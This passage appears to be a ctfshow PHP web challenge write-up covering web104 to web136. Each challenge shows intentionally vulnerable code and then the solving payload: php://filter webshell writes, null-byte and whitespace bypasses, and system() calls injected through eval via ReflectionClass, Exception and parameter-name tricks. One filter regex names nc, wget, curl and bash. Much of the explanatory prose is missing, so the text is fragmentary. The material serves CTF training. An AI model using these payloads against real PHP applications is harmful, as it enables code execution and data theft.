class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token comment">//  5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_funcaddadd23<strong>call_user_func</strong>add(2, 3)5</p><p>$callback<strong>call_user_func</strong><br><code>hex2bin() </code> ASCII <br><code>bin2hex()</code>ASCII  <br>v1$s<code>call_user_func</code>$s<br>v2v3</p><blockquote><p><strong>GET</strong><br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br><strong>POST</strong><br>v1&#x3D;hex2bin<br>#2.phpflag</p></blockquote><p><a href="https://blog.csdn.net/m0_62094846/article/details/122497198"></a></p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>foreach</code></p><blockquote><p>foreach &#x2F;<br><code>foreach ($array as $value)</code></p></blockquote><blockquote><p><code>die() </code></p></blockquote><p> $value <br>getkeykey&#x3D;&#x3D;=errorwhat are you doing?!value<br>postkeykey&#x3D;&#x3D;=flagwhat are you doing?!value<br>postflag$flagflag<br>payload:</p><blockquote><p>GET:<br>?x&#x3D;flag<br>POST:<br>error&#x3D;x</p></blockquote><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>postv1getv3<br><code>parse_str(\$v1,\$v2);</code>v1v2<br><code> if($v2[&#39;flag&#39;]==md5($v3))&#123;</code>v2flagv3MD5<br>payload<br>GET?v3&#x3D;2<br>POSTv1&#x3D;flag&#x3D;c81e728d9d4c2f636f067f89cc14862c<br>flag<br><img src="https://img-blog.csdnimg.cn/0a7356866de6432faeb98ab83664f174.png" alt="1"></p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//36dflag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//0x36d=877</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>^$<br><code>if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;</code><br>geta-zA-Ztrueiftruedie<br><code>if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;</code>877<br>payload<code>?c=a%00778</code>(%00)<br><img src="https://img-blog.csdnimg.cn/3a66812e55b34ce78493c509e02c84fe.png" alt="2"></p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v1v2eval()<br>payload<code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code><code>?v1=ReflectionClass&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>flag</p><blockquote><p><strong>?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(cat fl36dg.txt)</strong><br>PHPls<br>PHPReflectionClasssystem(ls)system(ls)shelllsReflectionClassls</p></blockquote><blockquote><p><code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code><br>PHPsystem()lsExceptionecho<br>PHPlsExceptionls</p></blockquote><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php<br><strong>FilesystemIterator</strong><br><strong>getcwd</strong><br><img src="https://img-blog.csdnimg.cn/0f75cdbef7f64326b050074b58979d04.png" alt="1"><br>payload:<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br><img src="https://img-blog.csdnimg.cn/8c05431e2cff4c28863fa30926446d1a.png" alt="2"><br>flag</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2310602538cb43ab9e19ec98fe2c2ef2.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/270988a18f6d41919e68794c19bbb57b.png" alt="2"><br><strong>\f</strong></p><p>payload<br>GET?num&#x3D;%0c36</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$a</code>CTF_SHOWCTF_SHOW.COMfl0g<br>payload<code>POST CTF_SHOW=1&amp;CTF_SHOW.COM=2&amp;fun=echo $flag</code><code>.</code>phpphppostget+[  _[  _<br>payload<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>highlight_file()<br>payload<code>**GET** ?shell=flag.php  **POST**  CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[shell]) </code></p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|system|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    